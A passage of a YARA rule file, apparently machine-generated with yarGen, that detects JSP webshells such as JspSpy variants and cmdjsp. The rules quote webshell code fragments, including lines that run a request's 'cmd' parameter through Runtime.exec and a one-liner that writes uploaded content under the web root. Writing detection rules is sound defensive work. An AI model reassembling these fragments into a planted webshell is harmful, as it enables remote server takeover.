      date = "2024-07-10"
      hash1 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
   strings:
      $s1 = "responseContent = tempStr.toString();" fullword ascii
      $s2 = "private static final String PW = \"xfg\"; //password" fullword ascii
      $s3 = "String tempLine = rd.readLine();" fullword ascii
      $s4 = "tempStr.append(tempLine);" fullword ascii
      $s5 = "tempLine = rd.readLine();" fullword ascii
      $s6 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
      $s7 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
      $s8 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
      $s9 = "while (tempLine != null)" fullword ascii
      $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
      $s11 = "HttpURLConnection url_con = null;" fullword ascii
      $s12 = "tempStr.append(crlf);" fullword ascii
      $s13 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
      $s14 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
      $s15 = "private static int readTimeOut = 10000;" fullword ascii
      $s16 = "InputStream in = url_con.getInputStream();" fullword ascii
      $s17 = "url_con.setRequestMethod(\"POST\");" fullword ascii
      $s18 = "s += SysInfo.charAt(i);" fullword ascii
      $s19 = "url_con.getOutputStream().close();" fullword ascii
      $s20 = "String responseContent = null;" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule JspSpyJDK5 {
   meta:
      description = "webshell - file JspSpyJDK5.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
   strings:
      $s1 = "responseContent = tempStr.toString();" fullword ascii
      $s2 = "private static final String PW = \"xfg\"; //password" fullword ascii
      $s3 = "String tempLine = rd.readLine();" fullword ascii
      $s4 = "tempStr.append(tempLine);" fullword ascii
      $s5 = "tempLine = rd.readLine();" fullword ascii
      $s6 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
      $s7 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
      $s8 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
      $s9 = "while (tempLine != null)" fullword ascii
      $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
      $s11 = "HttpURLConnection url_con = null;" fullword ascii
      $s12 = "tempStr.append(crlf);" fullword ascii
      $s13 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
      $s14 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
      $s15 = "private static int readTimeOut = 10000;" fullword ascii
      $s16 = "InputStream in = url_con.getInputStream();" fullword ascii
      $s17 = "url_con.setRequestMethod(\"POST\");" fullword ascii
      $s18 = "s += SysInfo.charAt(i);" fullword ascii
      $s19 = "url_con.getOutputStream().close();" fullword ascii
      $s20 = "String responseContent = null;" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 300KB and
      8 of them
}

rule webshell_jsp_807 {
   meta:
      description = "webshell - file 807.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
   strings:
      $s1 = "responseContent = tempStr.toString();" fullword ascii
      $s2 = "private static final String PW = \"xfgSS\"; //password" fullword ascii
      $s3 = "String tempLine = rd.readLine();" fullword ascii
      $s4 = "tempStr.append(tempLine);" fullword ascii
      $s5 = "tempLine = rd.readLine();" fullword ascii
      $s6 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
      $s7 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
      $s8 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
      $s9 = "while (tempLine != null)" fullword ascii
      $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
      $s11 = "HttpURLConnection url_con = null;" fullword ascii
      $s12 = "tempStr.append(crlf);" fullword ascii
      $s13 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
      $s14 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
      $s15 = "private static int readTimeOut = 10000;" fullword ascii
      $s16 = "InputStream in = url_con.getInputStream();" fullword ascii
      $s17 = "url_con.setRequestMethod(\"POST\");" fullword ascii
      $s18 = "s += SysInfo.charAt(i);" fullword ascii
      $s19 = "url_con.getOutputStream().close();" fullword ascii
      $s20 = "String responseContent = null;" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule cofigrue {
   meta:
      description = "webshell - file cofigrue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
   strings:
      $s1 = "responseContent = tempStr.toString();" fullword ascii
      $s2 = "private static final String PW = \"rjmJsp\"; //password" fullword ascii
      $s3 = "String tempLine = rd.readLine();" fullword ascii
      $s4 = "tempStr.append(tempLine);" fullword ascii
      $s5 = "tempLine = rd.readLine();" fullword ascii
      $s6 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; Love  You.</span><a href=\\\"\\\" target=\\\"_blank\\\"></a>RuiJianMei" ascii
      $s7 = "* Code LYK" fullword ascii
      $s8 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
      $s9 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
      $s10 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
      $s11 = "* Rui JiangMei . I Love You." fullword ascii
      $s12 = "while (tempLine != null)" fullword ascii
      $s13 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
      $s14 = "HttpURLConnection url_con = null;" fullword ascii
      $s15 = "tempStr.append(crlf);" fullword ascii
      $s16 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
      $s17 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
      $s18 = "private static int readTimeOut = 10000;" fullword ascii
      $s19 = "InputStream in = url_con.getInputStream();" fullword ascii
      $s20 = "url_con.setRequestMethod(\"POST\");" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 300KB and
      8 of them
}

rule webshell_jsp_dm {
   meta:
      description = "webshell - file dm.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
   strings:
      $s1 = "responseContent = tempStr.toString();" fullword ascii
      $s2 = "private static final String PW = \"xfg\"; //password" fullword ascii
      $s3 = "String tempLine = rd.readLine();" fullword ascii
      $s4 = "tempStr.append(tempLine);" fullword ascii
      $s5 = "tempLine = rd.readLine();" fullword ascii
      $s6 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
      $s7 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
      $s8 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
      $s9 = "while (tempLine != null)" fullword ascii
      $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
      $s11 = "HttpURLConnection url_con = null;" fullword ascii
      $s12 = "tempStr.append(crlf);" fullword ascii
      $s13 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
      $s14 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
      $s15 = "private static int readTimeOut = 10000;" fullword ascii
      $s16 = "InputStream in = url_con.getInputStream();" fullword ascii
      $s17 = "url_con.setRequestMethod(\"POST\");" fullword ascii
      $s18 = "s += SysInfo.charAt(i);" fullword ascii
      $s19 = "url_con.getOutputStream().close();" fullword ascii
      $s20 = "String responseContent = null;" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule webshell_jsp_x7 {
   meta:
      description = "webshell - file x7.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
   strings:
      $s1 = "<%-- FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\"); --%>" fullword ascii
      $s2 = "responseContent = tempStr.toString();" fullword ascii
      $s3 = "private static final String PW = \"xfg\"; //password" fullword ascii
      $s4 = "String tempLine = rd.readLine();" fullword ascii
      $s5 = "tempStr.append(tempLine);" fullword ascii
      $s6 = "tempLine = rd.readLine();" fullword ascii
      $s7 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
      $s8 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
      $s9 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
      $s10 = "while (tempLine != null)" fullword ascii
      $s11 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
      $s12 = "<%-- public static String uc(String str)" fullword ascii
      $s13 = "HttpURLConnection url_con = null;" fullword ascii
      $s14 = "tempStr.append(crlf);" fullword ascii
      $s15 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
      $s16 = "private static int readTimeOut = 10000;" fullword ascii
      $s17 = "InputStream in = url_con.getInputStream();" fullword ascii
      $s18 = "url_con.setRequestMethod(\"POST\");" fullword ascii
      $s19 = "s += SysInfo.charAt(i);" fullword ascii
      $s20 = "url_con.getOutputStream().close();" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule webshell_jsp_ma3 {
   meta:
      description = "webshell - file ma3.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
   strings:
      $s1 = "private static final String PW = \"xuying\";" fullword ascii
      $s2 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
      $s3 = "? : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"5" ascii
      $s4 = "? : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"5" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      all of them
}

rule webshell_jsp_xia {
   meta:
      description = "webshell - file xia.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
   strings:
      $s1 = "private static final String PW = \"avvcd\";" fullword ascii
      $s2 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
      $s3 = "? : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"5" ascii
      $s4 = "? : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"5" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      all of them
}

rule webshell_jsp_mmym520 {
   meta:
      description = "webshell - file mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "private static final String PW = \"mmym\"; //password" fullword ascii
      $s2 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
      $s3 = "8 : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"5" ascii
      $s4 = "8 : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"5" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      all of them
}

rule sig_2022_09_03_01 {
   meta:
      description = "webshell - file 2022-09-03-01.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e8dda541874dd53040f4c78792b9827b2c44bb746b4b358aa87a30c73b054688"
   strings:
      $s1 = "    Process process = Runtime.getRuntime().exec(cmd);" fullword ascii
      $s2 = "    InputStream is = process.getInputStream();" fullword ascii
      $s3 = "<%@ page import=\"java.io.InputStreamReader\" %>" fullword ascii
      $s4 = "<%@ page import=\"java.io.BufferedReader\" %>" fullword ascii
      $s5 = "    String cmd = request.getParameter(\"cmd\");" fullword ascii
      $s6 = "<%@ page import=\"java.io.InputStream\" %>" fullword ascii
      $s7 = "<%@page language=\"java\" pageEncoding=\"utf-8\" %>" fullword ascii
      $s8 = "        response.getWriter().println(r);" fullword ascii
      $s9 = "    while((r = bufferedReader.readLine())!=null){" fullword ascii
      $s10 = "    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule sig_2022_09_03_02 {
   meta:
      description = "webshell - file 2022-09-03-02.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cb884009eb6d17c9bd372628b02bb47740ca877ff64b9c656e568b902cc719b6"
   strings:
      $s1 = "  Process process = new ProcessBuilder(new String[]{cmd}).start();" fullword ascii
      $s2 = "  InputStream is = process.getInputStream();" fullword ascii
      $s3 = "  String cmd = request.getParameter(\"cmd\");" fullword ascii
      $s4 = "<%@ page import=\"java.io.InputStreamReader\" %>" fullword ascii
      $s5 = "<%@ page import=\"java.io.BufferedReader\" %>" fullword ascii
      $s6 = "<%@ page import=\"java.io.InputStream\" %>" fullword ascii
      $s7 = "  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));" fullword ascii
      $s8 = "  while((r = bufferedReader.readLine())!=null){" fullword ascii
      $s9 = "<%@page language=\"java\" pageEncoding=\"utf-8\" %>" fullword ascii
      $s10 = "  String r = null;" fullword ascii
      $s11 = "    response.getWriter().println(r);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      8 of them
}

rule sig_2022_09_03_03 {
   meta:
      description = "webshell - file 2022-09-03-03.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6f403514d1268724c8dfcf094cba52f6ab783099b8252c7d876dafd432134a68"
   strings:
      $s1 = "  Expression expr = new Expression(Runtime.getRuntime(), \"exec\", new Object[]{cmd});" fullword ascii
      $s2 = "  Process process = (Process) expr.getValue();" fullword ascii
      $s3 = "  InputStream in = process.getInputStream();" fullword ascii
      $s4 = "  String cmd = request.getParameter(\"cmd\");" fullword ascii
      $s5 = "<%@ page import=\"java.io.InputStreamReader\" %>" fullword ascii
      $s6 = "<%@ page import=\"java.io.BufferedReader\" %>" fullword ascii
      $s7 = "  while((tmp = bufferedReader.readLine())!=null){" fullword ascii
      $s8 = "<%@ page import=\"java.io.InputStream\" %>" fullword ascii
      $s9 = "  String tmp = null;" fullword ascii
      $s10 = "<%@ page import=\"java.beans.Expression\" %>" fullword ascii
      $s11 = "    response.getWriter().println(tmp);" fullword ascii
      $s12 = "  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));" fullword ascii
      $s13 = "<%@ page language=\"java\" pageEncoding=\"UTF-8\" %>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      8 of them
}

rule webshell_jsp_w03 {
   meta:
      description = "webshell - file w03.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "df87bec770122ec22c5f2b09b1d4d00fabd10068729af31286e9991196ef91cb"
   strings:
      $s1 = "testtesttest\",\"\").getBytes());%>" fullword ascii
      $s2 = "<%new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\")).write(request.getParameter(\"t\").rep" ascii
      $s3 = "<%new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\")).write(request.getParameter(\"t\").rep" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_he1p {
   meta:
      description = "webshell - file he1p.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s3 = "String execute = request.getParameter(\"execute\");" fullword ascii
      $s4 = "file.setExecutable(true);" fullword ascii
      $s5 = "file.setExecutable(false);" fullword ascii
      $s6 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s7 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s8 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword ascii
      $s9 = "private static final String PW = \"a1b2c3a4\"; //password" fullword ascii
      $s10 = "if (Util.isEmpty(execute)) {" fullword ascii
      $s11 = "ze(currentRoot.getTotalSpace(),'G')+\"</h2>\");" fullword ascii
      $s12 = "String read = request.getParameter(\"read\");" fullword ascii
      $s13 = "file.setReadable(true);" fullword ascii
      $s14 = "file.setReadable(false);" fullword ascii
      $s15 = "String write = request.getParameter(\"write\");" fullword ascii
      $s16 = "if (Util.isEmpty(read)) {" fullword ascii
      $s17 = "file.setWritable(false);" fullword ascii
      $s18 = "file.setWritable(true);" fullword ascii
      $s19 = "7: <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"5" ascii
      $s20 = "if (Util.isEmpty(write)) {" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_1 {
   meta:
      description = "webshell - file 1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s3 = "String execute = request.getParameter(\"execute\");" fullword ascii
      $s4 = "file.setExecutable(true);" fullword ascii
      $s5 = "file.setExecutable(false);" fullword ascii
      $s6 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s7 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s8 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword ascii
      $s9 = "private static final String PW = \"kity\"; //password" fullword ascii
      $s10 = "if (Util.isEmpty(execute)) {" fullword ascii
      $s11 = "ze(currentRoot.getTotalSpace(),'G')+\"</h2>\");" fullword ascii
      $s12 = "String read = request.getParameter(\"read\");" fullword ascii
      $s13 = "file.setReadable(true);" fullword ascii
      $s14 = "file.setReadable(false);" fullword ascii
      $s15 = "String write = request.getParameter(\"write\");" fullword ascii
      $s16 = "if (Util.isEmpty(read)) {" fullword ascii
      $s17 = "file.setWritable(false);" fullword ascii
      $s18 = "file.setWritable(true);" fullword ascii
      $s19 = "if (Util.isEmpty(write)) {" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_nogfw {
   meta:
      description = "webshell - file nogfw.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s3 = "String execute = request.getParameter(\"execute\");" fullword ascii
      $s4 = "file.setExecutable(true);" fullword ascii
      $s5 = "file.setExecutable(false);" fullword ascii
      $s6 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s7 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s8 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword ascii
      $s9 = "private static final String PW = \"admin\"; //password" fullword ascii
      $s10 = "if (Util.isEmpty(execute)) {" fullword ascii
      $s11 = "ze(currentRoot.getTotalSpace(),'G')+\"</h2>\");" fullword ascii
      $s12 = "String read = request.getParameter(\"read\");" fullword ascii
      $s13 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//???????????" fullword ascii
      $s14 = "file.setReadable(true);" fullword ascii
      $s15 = "file.setReadable(false);" fullword ascii
      $s16 = "String write = request.getParameter(\"write\");" fullword ascii
      $s17 = "\"IP : <input name=\\\"ip\\\" type=\\\"text\\\" value=\\\"\"+ip+\"\\\" id=\\\"ip\\\" class=\\\"input\\\" style=\\\"width:10%;mar" ascii
      $s18 = "if (Util.isEmpty(read)) {" fullword ascii
      $s19 = "file.setWritable(false);" fullword ascii
      $s20 = "file.setWritable(true);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_JspSpy1 {
   meta:
      description = "webshell - file JspSpy1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s3 = "String execute = request.getParameter(\"execute\");" fullword ascii
      $s4 = "file.setExecutable(true);" fullword ascii
      $s5 = "file.setExecutable(false);" fullword ascii
      $s6 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s7 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s8 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword ascii
      $s9 = "private static final String PW = \"ninty\"; //password" fullword ascii
      $s10 = "if (Util.isEmpty(execute)) {" fullword ascii
      $s11 = "ze(currentRoot.getTotalSpace(),'G')+\"</h2>\");" fullword ascii
      $s12 = "String read = request.getParameter(\"read\");" fullword ascii
      $s13 = "file.setReadable(true);" fullword ascii
      $s14 = "file.setReadable(false);" fullword ascii
      $s15 = "String write = request.getParameter(\"write\");" fullword ascii
      $s16 = "if (Util.isEmpty(read)) {" fullword ascii
      $s17 = "file.setWritable(false);" fullword ascii
      $s18 = "file.setWritable(true);" fullword ascii
      $s19 = "if (Util.isEmpty(write)) {" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      8 of them
}

rule webshell_jsp_ok {
   meta:
      description = "webshell - file ok.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s3 = "String execute = request.getParameter(\"execute\");" fullword ascii
      $s4 = "file.setExecutable(true);" fullword ascii
      $s5 = "file.setExecutable(false);" fullword ascii
      $s6 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s7 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s8 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword ascii
      $s9 = "private static final String PW = \"admin\"; //password" fullword ascii
      $s10 = "if (Util.isEmpty(execute)) {" fullword ascii
      $s11 = "ze(currentRoot.getTotalSpace(),'G')+\"</h2>\");" fullword ascii
      $s12 = "String read = request.getParameter(\"read\");" fullword ascii
      $s13 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//&#38169;&#35823;&#20449;&#246" ascii
      $s14 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//&#38169;&#35823;&#20449;&#246" ascii
      $s15 = "file.setReadable(true);" fullword ascii
      $s16 = "file.setReadable(false);" fullword ascii
      $s17 = "String write = request.getParameter(\"write\");" fullword ascii
      $s18 = "\"IP : <input name=\\\"ip\\\" type=\\\"text\\\" value=\\\"\"+ip+\"\\\" id=\\\"ip\\\" class=\\\"input\\\" style=\\\"width:10%;mar" ascii
      $s19 = "if (Util.isEmpty(read)) {" fullword ascii
      $s20 = "file.setWritable(false);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_style {
   meta:
      description = "webshell - file style.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s3 = "String execute = request.getParameter(\"execute\");" fullword ascii
      $s4 = "file.setExecutable(true);" fullword ascii
      $s5 = "file.setExecutable(false);" fullword ascii
      $s6 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s7 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s8 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword ascii
      $s9 = "if (Util.isEmpty(execute)) {" fullword ascii
      $s10 = "ze(currentRoot.getTotalSpace(),'G')+\"</h2>\");" fullword ascii
      $s11 = "String read = request.getParameter(\"read\");" fullword ascii
      $s12 = "file.setReadable(true);" fullword ascii
      $s13 = "file.setReadable(false);" fullword ascii
      $s14 = "String write = request.getParameter(\"write\");" fullword ascii
      $s15 = "if (Util.isEmpty(read)) {" fullword ascii
      $s16 = "file.setWritable(false);" fullword ascii
      $s17 = "file.setWritable(true);" fullword ascii
      $s18 = "private static final String PW = \"managerps\";" fullword ascii
      $s19 = "if (Util.isEmpty(write)) {" fullword ascii
      $s20 = "  <p>\"+" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_cmdjsp {
   meta:
      description = "webshell - file cmdjsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6ce16f41d53982aecca4076630d5fd6bff0f6ae6938430af1dbfb9cbac0e67f8"
   strings:
      $x1 = "         Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword ascii
      $x2 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword ascii
      $s3 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword ascii
      $s4 = "<INPUT name='cmd' type=text>" fullword ascii
      $s5 = "   String cmd = request.getParameter(\"cmd\");" fullword ascii
